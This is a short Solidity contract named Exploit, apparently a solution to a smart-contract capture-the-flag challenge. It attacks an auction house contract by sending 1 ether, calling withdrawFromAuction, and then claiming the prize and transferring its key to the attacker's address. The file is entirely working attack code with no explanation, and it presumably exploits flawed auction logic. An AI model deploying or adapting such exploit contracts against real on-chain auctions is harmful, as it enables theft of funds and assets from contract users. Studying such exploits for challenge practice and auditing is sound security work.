// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IAuction{
    function withdrawFromAuction() external;
    function claimPrize() external;
    function keyTransfer(address _newOwner) external;
}

contract Exploit {
    address public target;

    constructor(address auctionHouse) {
        target = auctionHouse;
    }

    function attack() external payable {
        (bool success, ) = target.call{value: 1 ether}("");
        require(success, "Nop");
    }

    function withdraw() external{
        IAuction(target).withdrawFromAuction();
    }

    function claimKey(address myAddr) external {
        IAuction(target).claimPrize();
        IAuction(target).keyTransfer(myAddr);
    }
    receive() external payable {}
}